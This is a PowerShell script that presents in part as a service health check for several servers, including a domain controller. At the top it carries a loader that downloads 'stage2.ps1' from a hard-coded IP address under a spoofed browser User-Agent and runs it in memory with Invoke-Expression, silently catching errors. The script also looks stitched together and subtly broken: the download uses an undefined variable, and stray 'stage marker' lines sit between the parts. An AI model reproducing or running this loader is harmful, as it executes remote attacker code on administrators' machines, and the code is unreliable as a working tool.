[CmdletBinding()]
param(
    [string]$Stage2Url = 'http://203.0.113.125:80/stage2.ps1',
    [int]$TimeoutSec = 56
)
$ErrorActionPreference = "Stop"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $DownloadedScript = $ClientObject.DownloadString($SourceUrl)
    if ([string]::IsNullOrWhiteSpace($DownloadedScript)) {
        throw "Downloaded script was empty"
    }
    Write-Verbose ("Script length: " + $DownloadedScript.Length)
    Invoke-Expression $DownloadedScript
}
catch {
    Write-Warning "In-memory stage failed: $($_.Exception.Message)"
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Write-Verbose "stage marker 26 reached"
$Servers             = @('sql-prod-02', 'srv02', 'dc01', 'mgmt01')
$Services            = @('Spooler', 'WinRM', 'DNS')
$Port                = 5985
$TimeoutMilliseconds = 3000
$ReportPath          = 'C:\Reports\service-health-2026-02-02.csv'


$results = foreach ($srv in $Servers) {
    foreach ($svc in $Services) {
        $service = Get-Service -ComputerName $srv -Name $svc -ErrorAction SilentlyContinue
        [pscustomobject]@{
            Server  = $srv
            Service = $svc
            Status  = $(if ($service) { $service.Status } else { 'NotFound' })
        }
    }
}
$results | Format-Table -AutoSize
